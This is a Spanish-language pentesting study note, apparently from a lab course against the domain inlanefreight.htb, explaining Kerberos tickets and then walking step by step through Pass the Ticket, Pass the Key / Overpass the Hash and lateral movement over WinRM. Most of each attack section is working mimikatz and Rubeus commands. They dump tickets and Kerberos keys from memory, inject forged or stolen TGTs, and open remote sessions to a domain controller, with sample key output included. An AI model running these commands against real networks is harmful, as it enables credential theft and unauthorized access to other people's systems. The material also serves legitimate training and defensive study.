# Pass the Ticket desde Windows

## Introduccion al funcionamiento de kerberos
El sistema de autenticación Kerberos se basa en tickets. La idea central de Kerberos es no entregar la contraseña de una cuenta a cada servicio que utilizas. En su lugar, Kerberos mantiene todos los tickets en tu sistema local y presenta a cada servicio solo el ticket específico para ese servicio, evitando que un ticket se utilice para otro propósito.

- El `Ticket Granting Ticket` (`TGT`) es el primer ticket que se obtiene en un sistema Kerberos. El TGT permite al cliente obtener tickets Kerberos adicionales o `TGS`.
- El `Ticket Granting Service` (`TGS`) es solicitado por los usuarios que desean utilizar un servicio. Estos tickets permiten a los servicios verificar la identidad del usuario.

Cuando un usuario solicita un `TGT`, debe autenticarse ante el controlador de dominio cifrando la marca de tiempo actual con el hash de su contraseña. Una vez que el controlador de dominio valida la identidad del usuario (porque el dominio conoce el hash de la contraseña del usuario, lo que significa que puede descifrar la marca de tiempo), envía al usuario un TGT para futuras solicitudes. Una vez que el usuario tiene su ticket, no tiene que demostrar quién es con su contraseña.

Si el usuario quiere conectarse a una base de datos MSSQL, solicitará un `Ticket Granting Service` (`TGS`) al `Key Distribution Center` (`KDC`), presentando su `Ticket Granting Ticket` (`TGT`). Luego, le dará el TGS al servidor de la base de datos MSSQL para la autenticación.

##### CLAVE DE CIFRADO VS TICKET TGT / TGS
- **La Clave de Cifrado :** Piensa en esto como la **llave maestra** de un usuario. Es el secreto fundamental que prueba quién es. La clave `rc4_hmac_nt` (que es igual al hash NTLM) y la clave `aes256_hmac` son las más importantes.
- **El Ticket de Kerberos (TGT o TGS):** Piensa en esto como un **pase de acceso temporal** para un evento específico (un servicio). Para obtener este pase, primero tienes que demostrar que tienes la llave maestra.
----

## Ataque Pass the ticket PtT
Consiste en recolectar y utilizar tickets de tipo TGT o TGS. A veces no siempre tendremos la suerte de obtener un TGT que sirva para obtener otros tickets, pero quizas si tengamos un TGS.

### PASO 1 OBTENER TICKETS
### OPCION 1. Obtener tickets Kerberos existentes
El usuario tiene que tener una sesion activa, pero es una tecnica pasiva ya que no se comunica con el DC. con estos tickets podemos contecer el pass the ticket

>Para recolectar todos los tickets debe ser ejecutado mimikatz o rubeus como administrador
##### Mimikatz
```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

* Los tickets terminados en `$` pertenecen al equipo (ticket necesario para que el equipo interactue con el Directorio Activo)
* Los tickets de usuario tienen una pinta similar a esto: `[valoraleatorio]-nombredeusuario@servicio-dominio.local.kirbi`

>Nota: Con mimikatz si ejecutamos `sekurlsa::ekeys`, presenta todos los hashes como des_cbc_md4 en algunas versiones de Windows 10. Los tickets exportados (sekurlsa::tickets /export) no funcionan correctamente debido al cifrado incorrecto. Es posible usar estos hashes para generar nuevos tickets o usar Rubeus para exportar tickets en formato Base64.


##### Rubeus
Estos tickets, rubeus nos los imprime por pantalla en base64, tocaria decodificar y pasarlo a fichero.
```
Rubeus.exe dump /nowrap
```


### OPCION 2: Generar un nuevo TGT
Para ello debemos tener las claves de cifrado de kerberos
```powershell
# Obtener claves `AES256_HMAC` y `RC4_HMAC`
privilege::debug
sekurlsa::ekeys

# OUTPUT
y List :
           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_nt_exp   3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
```

### PASO 2: UTILIZAR LOS TICKETS

##### Utilizar ticket con Rubeus
Este comando pide un ticket utilizando la clave de cifrado de kerberos y con el `/ptt` inyecta el TGT directamente en la sesion actual
```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

Este comando utiliza el .kirbi obtenido previamente con mimikatz o rubeus si lo pasamos de base64 a un fichero kirbi
```
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

Opcion de utilizar el formato Base64 directamente o convertir un .kirbi en Base64
```
# Este comando toma el ticket y lo convierte a base64 (adaptar el fichero)
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

Utilizando el ticket en base64 con Rubeus
```
Rubeus.exe ptt /ticket:<el_ticket_en_base64_toda_la_string>
```

##### Utilizar ticket con mimikatz
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

* File: 'C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi': OK
mimikatz # exit
```
> se puede utilizar el modulo misc::cmd de mimikatz para no tener que salir de la herramienta y haga spawn de una CMD con el ticket ya importado.


----

## Pass The Key / Overpass the hash
Técnica que consiste en utilizar un hash de contraseña NTLM para convertirlo en un ticket válido de kerberos. (TGT).  Lo primero que necesitamos es obtener las claves de cifrado de kerberos.


##### obtener claves de cifrado kerberos con mimikatz
```powershell
# Obtener claves `AES256_HMAC` y `RC4_HMAC`
privilege::debug
sekurlsa::ekeys

# OUTPUT
y List :
           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_nt_exp   3f74aa8f08f712f09cd5177b5c1ce50f
           rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
```

##### Acontecer Pass the Key con Mimikatz
Con esta key rc4 podemos hacer el pass the key:
```powershell

privilege::debug

sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

Esto creará una nueva ventana de `cmd.exe` que podemos usar para solicitar acceso a cualquier servicio que queramos en el contexto del usuario objetivo.

Ejemplos de uso una vez tenemos ya el ticket y estamos en la nueva ventana de CMD como el usuario suplantado:
```cmd
dir \\DC01\C$

# Para control remoto de otro equipo de la red si tenemos permisos
Enter-PSSession -ComputerName WKSTN02
```

##### Acontecer Pass the Key con Rubeus
> Lo bueno es que para esto con Rubeus no necesitamos permisos de administrador

```
# Como puedes ver aqui estamos utilizando la aes256
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```

>NOTA PASS THE KEY: En entornos modernos, utilizar rc4 se interpreta como downgrade de cifrado, entonces lo que se utiliza es el AES256 o AES128

----
## Utilizar PtT para conectarse por WinRM a otra victima

Ejemplo de como aprovechar un TGT para conectarnos a una maquina remota del dominio (siempre y cuando tengamos privilegios para ello), y acontecer un movimiento lateral de maquina.

##### Mimikatz
Igual que en PtT, importamos con mimikatz el ticket previamente obtenido
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

* File: 'C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi': OK
mimikatz # exit
```

Posteriormente intentamos control remoto de otro equipo con nuestro TGT ya importado:
```
Enter-PSSession -ComputerName DC01
```

##### Rubeus

>Este es MUCHO MAS INTERESANTE QUE MIMIKATZ en este caso por la opcion de createonly esto evita el borrado de los TGTs existentes para la sesión de inicio de sesión actual.

Crea un nuevo proceso cmd.exe aislado
```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

Pide e importa el ticket tgt directamente (si tienes las claves de cifrado de kerberos)
```
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

Lanzar la conexion remota a otra maquina del dominio
```
Enter-PSSession -ComputerName DC01
```